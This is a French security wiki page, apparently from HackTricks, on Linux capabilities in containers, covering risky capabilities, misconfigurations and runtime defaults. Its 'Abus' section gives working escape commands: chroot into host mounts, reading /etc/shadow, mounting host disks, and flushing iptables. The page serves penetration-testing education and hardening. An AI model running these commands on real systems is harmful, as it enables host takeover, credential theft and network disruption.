# Capacités Linux dans les conteneurs

{{#include ../../../../banners/hacktricks-training.md}}

## Aperçu

Les capacités Linux sont l'un des éléments les plus importants de la sécurité des conteneurs car elles répondent à une question subtile mais fondamentale : **que signifie réellement "root" à l'intérieur d'un conteneur ?** Sur un système Linux classique, UID 0 impliquait historiquement un ensemble de privilèges très large. Dans les noyaux modernes, ce privilège est décomposé en unités plus petites appelées capacités. Un processus peut s'exécuter en tant que root et néanmoins ne pas disposer de nombreuses opérations puissantes si les capacités pertinentes ont été retirées.

Les conteneurs reposent fortement sur cette distinction. De nombreuses charges de travail sont encore lancées en tant que UID 0 à l'intérieur du conteneur pour des raisons de compatibilité ou de simplicité. Sans suppression des capacités, cela serait beaucoup trop dangereux. Avec la suppression des capacités, un processus root containerisé peut encore effectuer de nombreuses tâches ordinaires dans le conteneur tout en se voyant refuser des opérations noyau plus sensibles. C'est pourquoi un shell de conteneur indiquant `uid=0(root)` ne signifie pas automatiquement "host root" ni même "privilèges noyau étendus". Les ensembles de capacités déterminent la valeur réelle de cette identité root.

Pour la référence complète des Linux capabilities et de nombreux exemples d'abus, voir :

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Fonctionnement

Les capacités sont suivies dans plusieurs ensembles, y compris les ensembles permitted, effective, inheritable, ambient, et bounding. Pour de nombreuses évaluations de conteneurs, la sémantique exacte du noyau pour chaque ensemble est moins immédiatement importante que la question pratique finale : **quelles opérations privilégiées ce processus peut-il effectuer avec succès maintenant, et quels gains de privilèges futurs sont encore possibles ?**

La raison pour laquelle cela importe est que de nombreuses breakout techniques sont en réalité des problèmes de capabilities déguisés en problèmes de conteneurs. Un workload avec `CAP_SYS_ADMIN` peut atteindre une grande partie des fonctionnalités du noyau auxquelles un processus root normal dans un conteneur ne devrait pas toucher. Un workload avec `CAP_NET_ADMIN` devient beaucoup plus dangereux s'il partage aussi le namespace réseau de l'hôte. Un workload avec `CAP_SYS_PTRACE` devient beaucoup plus intéressant s'il peut voir les processus de l'hôte via le partage de PID de l'hôte. Dans Docker ou Podman cela peut apparaître comme `--pid=host` ; dans Kubernetes cela apparaît généralement comme `hostPID: true`.

En d'autres termes, l'ensemble de capabilities ne peut pas être évalué isolément. Il doit être lu conjointement avec les namespaces, seccomp, et la politique MAC.

## Exercice

Une façon très directe d'inspecter les capacités à l'intérieur d'un conteneur est :
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Vous pouvez également comparer un conteneur plus restrictif avec un conteneur auquel toutes les capabilities ont été ajoutées :
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Pour voir l'effet d'un ajout restreint, essayez de tout supprimer puis de réajouter uniquement une capability :
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ces petites expériences montrent qu'un runtime ne se contente pas de basculer un booléen appelé "privileged". Il façonne la surface de privilèges réellement disponible pour le processus.

## Capacités à haut risque

Même si de nombreuses capacités peuvent être importantes selon la cible, quelques-unes sont régulièrement pertinentes dans l'analyse des container escape.

**`CAP_SYS_ADMIN`** est celle que les défenseurs doivent traiter avec le plus de suspicion. On la décrit souvent comme "the new root" car elle débloque une quantité énorme de fonctionnalités, notamment les opérations liées au mount, le comportement sensible aux namespace, et de nombreux chemins du kernel qui ne devraient jamais être exposés aux containers par inadvertance. Si un container dispose de `CAP_SYS_ADMIN`, d'un seccomp faible, et d'aucune confinement MAC solide, de nombreux chemins classiques de breakout deviennent beaucoup plus réalistes.

**`CAP_SYS_PTRACE`** est important lorsque la visibilité des processus existe, en particulier si le PID namespace est partagé avec le host ou avec des workloads voisins intéressants. Il peut transformer la visibilité en altération.

**`CAP_NET_ADMIN`** et **`CAP_NET_RAW`** comptent dans les environnements axés réseau. Sur un réseau bridge isolé ils peuvent déjà être risqués ; sur un host network namespace partagé ils sont bien pires parce que le workload peut être capable de reconfigurer le réseau de l'hôte, d'écouter, de usurper, ou d'interférer avec les flux de trafic locaux.

**`CAP_SYS_MODULE`** est généralement catastrophique dans un environnement rootful parce que le chargement de modules kernel équivaut à un contrôle du kernel de l'hôte. Elle ne devrait presque jamais apparaître dans un workload container généraliste.

## Usage du runtime

Docker, Podman, containerd-based stacks, et CRI-O utilisent tous des contrôles de capacités, mais les valeurs par défaut et les interfaces de gestion diffèrent. Docker les expose très directement via des flags tels que `--cap-drop` et `--cap-add`. Podman expose des contrôles similaires et bénéficie fréquemment d'une exécution rootless comme couche de sécurité additionnelle. Kubernetes expose les ajouts et suppressions de capacités via le `securityContext` du Pod ou du container. Les environnements system-container tels que LXC/Incus s'appuient aussi sur le contrôle des capacités, mais l'intégration plus large avec l'hôte de ces systèmes pousse souvent les opérateurs à relâcher les valeurs par défaut plus agressivement qu'ils ne le feraient dans un environnement d'app-container.

Le même principe vaut pour tous : une capability techniquement possible à accorder n'est pas nécessairement une capability qui devrait être accordée. De nombreux incidents réels commencent lorsqu'un opérateur ajoute une capability simplement parce qu'un workload échouait sous une configuration plus stricte et que l'équipe avait besoin d'un correctif rapide.

## Mauvaises configurations

L'erreur la plus évidente est **`--cap-add=ALL`** dans les CLI de type Docker/Podman, mais ce n'est pas la seule. En pratique, un problème plus courant est d'accorder une ou deux capabilities extrêmement puissantes, en particulier `CAP_SYS_ADMIN`, pour "faire fonctionner l'application" sans comprendre également les implications sur les namespace, seccomp, et les mounts. Un autre mode d'échec fréquent est de combiner des capabilities supplémentaires avec le partage de namespaces de l'hôte. Dans Docker ou Podman cela peut apparaître comme `--pid=host`, `--network=host`, ou `--userns=host` ; dans Kubernetes l'exposition équivalente apparaît généralement via des paramètres de workload tels que `hostPID: true` ou `hostNetwork: true`. Chacune de ces combinaisons change ce que la capability peut réellement affecter.

Il est aussi courant de voir des administrateurs croire que parce qu'un workload n'est pas entièrement `--privileged`, il est quand même significativement contraint. Parfois c'est vrai, mais parfois la posture effective est déjà suffisamment proche de privileged pour que la distinction cesse d'avoir de l'importance opérationnelle.

## Abus

La première étape pratique consiste à inventorier l'ensemble effectif des capacités et à tester immédiatement les actions spécifiques à chaque capacité qui importeraient pour escape ou pour l'accès aux informations de l'hôte :
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Si `CAP_SYS_ADMIN` est présent, testez mount-based abuse et host filesystem access en priorité, car c'est l'un des breakout enablers les plus courants :
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Si `CAP_SYS_PTRACE` est présent et que le conteneur peut voir des processus intéressants, vérifiez si la capability peut être utilisée pour inspecter des processus :
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Si `CAP_NET_ADMIN` ou `CAP_NET_RAW` est présent, vérifiez si la charge de travail peut manipuler la pile réseau visible ou au moins recueillir des renseignements réseau utiles :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Lorsque un capability test réussit, combinez-le avec la situation du namespace. Une capability qui paraissait simplement risquée dans un namespace isolé peut devenir immédiatement une primitive d'escape ou de host-recon lorsque le container partage aussi le host PID, le host network ou les host mounts.

### Exemple complet : `CAP_SYS_ADMIN` + Host Mount = Host Escape

Si le container a `CAP_SYS_ADMIN` et un writable bind mount du host filesystem comme `/host`, le chemin d'escape est souvent direct :
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Si `chroot` réussit, les commandes s'exécutent désormais dans le contexte du système de fichiers racine de l'hôte :
```bash
id
hostname
cat /etc/shadow | head
```
Si `chroot` n'est pas disponible, le même résultat peut souvent être obtenu en appelant le binaire via l'arborescence montée :
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Exemple complet : `CAP_SYS_ADMIN` + accès au périphérique

Si un périphérique de bloc de l'hôte est exposé, `CAP_SYS_ADMIN` peut le transformer en un accès direct au système de fichiers de l'hôte :
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Exemple complet : `CAP_NET_ADMIN` + Host Networking

Cette combinaison ne produit pas toujours directement un host root, mais elle peut reconfigurer complètement la pile réseau de l'hôte :
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Cela peut permettre un déni de service, l'interception du trafic ou l'accès à des services qui étaient précédemment filtrés.

## Vérifications

L'objectif des vérifications des capabilities n'est pas seulement de dumper les valeurs brutes, mais de comprendre si le processus possède suffisamment de privilèges pour rendre sa configuration actuelle de namespace et de mount dangereuse.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Ce qui est intéressant ici :

- `capsh --print` est le moyen le plus simple pour repérer des capabilities à haut risque comme `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ou `cap_sys_module`.
- La ligne `CapEff` dans `/proc/self/status` indique ce qui est effectivement effectif maintenant, pas seulement ce qui pourrait être disponible dans d'autres ensembles.
- Un dump de capabilities devient bien plus important si le container partage aussi les namespaces PID, network, ou user de l'hôte, ou s'il a des montages de l'hôte en écriture.

Après avoir recueilli les informations brutes sur les capabilities, l'étape suivante est l'interprétation. Demandez si le process est root, si les user namespaces sont activés, si des namespaces de l'hôte sont partagés, si seccomp est en enforcement, et si AppArmor ou SELinux restreignent encore le process. Un capability set pris isolément n'est qu'une partie de l'histoire, mais c'est souvent la partie qui explique pourquoi un container breakout fonctionne et qu'un autre échoue avec le même point de départ apparent.

## Paramètres par défaut du runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Jeu de capabilities réduit par défaut | Docker conserve une allowlist par défaut de capabilities et supprime les autres | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Jeu de capabilities réduit par défaut | Les conteneurs Podman sont non privilégiés par défaut et utilisent un modèle de capabilities réduit | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hérite des paramètres du runtime sauf modification | Si aucun `securityContext.capabilities` n'est spécifié, le container reçoit le jeu de capabilities par défaut du runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Généralement les paramètres par défaut du runtime | L'ensemble effectif dépend du runtime plus la spec du Pod | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Pour Kubernetes, le point important est que l'API ne définit pas un jeu de capabilities par défaut universel. Si le Pod n'ajoute ni ne supprime de capabilities, la charge de travail hérite du jeu par défaut du runtime pour ce nœud.
{{#include ../../../../banners/hacktricks-training.md}}
